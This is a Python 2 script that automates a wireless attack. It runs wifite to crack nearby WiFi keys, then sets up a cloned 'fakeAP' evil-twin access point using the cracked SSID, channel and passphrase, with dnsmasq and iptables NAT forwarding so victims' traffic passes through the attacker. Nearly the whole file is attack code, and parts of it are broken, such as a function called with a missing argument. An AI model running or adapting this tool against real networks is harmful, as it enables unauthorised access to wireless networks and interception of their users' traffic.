#!/usr/bin/env python

import os
import subprocess
from time import sleep

if os.geteuid() != 0:
    print("\nThis script requires you to run it with root privileges.\n")
    exit(0)

#Make sure that the interface isn't already in monitor mode!
def run_wifite(mon_name):
    try:
        os.system("airmon-ng check kill")
        os.system("ifconfig %s down" %mon_name)
        os.system("airmon-ng start %s" %mon_name)
        cmd = "ifconfig | grep mon | awk -F ':' '{print $1}' | awk '{print $1}'"
        mon_mode = str(os.popen(cmd).read()).strip('\n')
        os.system("wifite -mac -i %s " %mon_mode)
        return mon_mode
    except KeyboardInterrupt:
        print ("WiFite setup failed, exiting")


def network_restore(mon_name):
    os.system("airmon-ng stop %s" %mon_name)
    os.system("service network-manager restart")
    os.system("service networking restart")

def get_info(mon_name):
    #Parse cracked WiFite info
    crackedfile = file("cracked.txt")
    for line in crackedfile:
        if "\"bssid\": " in line:
            bssid = line.strip().strip("\"bssid\": ").strip("\",")
        elif "\"essid\": " in line:
            essid = line.strip().strip("\"essid\": ").strip("\",")
        elif "\"key\": " in line:
            key = line.strip().strip("\"key\": ").strip("\",")
        elif "\"type\": " in line:
            networktype = line.strip().strip("\"type\": ").strip("\"")

    os.system("airodump-ng %s 2>&1 | tee info.txt" %mon_name)

    print

    #Parse airodump-ng info
    dumpfile = file("info.txt")
    for line in dumpfile:
        if essid in line:
            bssid2 = line[1:18]
            #if bssid == bssid2:
                #print("SAME BSSID")
            #print(bssid2)
            channel = line[47:50].strip()
            #Encryption: OPN: no encryption, WEP: WEP encryption, WPA: WPA or WPA2 encryption, WEP?: WEP or WPA (don't know yet) 
            enc = line[57:61].strip()
            #cipher = line[62:66]
            auth = line[69:72]
            #print(channel)
            #print(enc)
            #print(cipher)
            #print(auth)
            break
    return (bssid, essid, key, networktype, channel, enc, auth)

def make_hostapd_conf(interface_name, info_list):
    file = open("fakeAP.conf", "w")
    file.write("interface=%s\n" %interface_name)
    file.write("driver=nl80211\n")
    file.write("hw_mode=g\n")
    file.write("ssid=%s\n" %info_list[1])
    file.write("channel=%s\n" %info_list[4])
    file.write("macaddr_acl=0\n")
    #file.write("ignore_broadcast_ssid=0\n")
    file.write("auth_algs=1\n")
    if info_list[5] == "OPN":
        file.write("wpa=0\n")
    elif info_list[5] == "WEP":
        file.write("wpa=1\n")
    else:
        file.write("wpa=2\n")
    file.write("wpa_passphrase=%s\n" %info_list[2])
    if info_list[6] == "PSK":
        file.write("wpa_key_mgmt=WPA-PSK\n")

if __name__ == "__main__":
    #Print out wireless interfaces

    os.system("iwconfig")
    print ("Do you have at least 2 wireless interfaces before proceeding? ")

    monitor_name = raw_input ("What is the name of your wireless interface that supports monitor mode? ")
    ap_name = raw_input("What is the name of your AP wireless interface? ")

    print ("\nStarting WiFite with monitor interface...")
    mon_name = run_wifite(monitor_name)

    raw_input ("Continue? ")

    info = get_info(mon_name)

    raw_input ("Continue? ")

    #if we want to provide internet we need to reset the interfaces
    print("Restarting network interfaces...")
    network_restore(mon_name)

    #Set the AP interface to the BSSID of cracked network and necessary routing
    #of the ip tables to forward internet
    os.system("ifconfig wlan0 down")
    os.system("ifconfig wlan0 inet 192.168.2.1 netmask 255.255.255.0")
    #os.system("ifconfig wlan0 hw ether 0c:80:63:1a:a7:33")
    os.system("ifconfig wlan0 up")

    os.system("route add -net 192.168.2.0 netmask 255.255.255.0 gw 192.168.2.1")


    #build config file for hostapd
    make_hostapd_conf(ap_name)

    #dnsmasq start
    os.system("dnsmasq -C dnsmasq.conf")    
    #start the fake AP
    os.system("hostapd fakeAP.conf")

    raw_input ("Connect to the internet? ")
    
    os.system("iptables -t nat -A POSTROUTING --out-interface wlan1 -j MASQUERADE")
    os.system("iptables -A FORWARD --in-interface wlan0 -j ACCEPT")
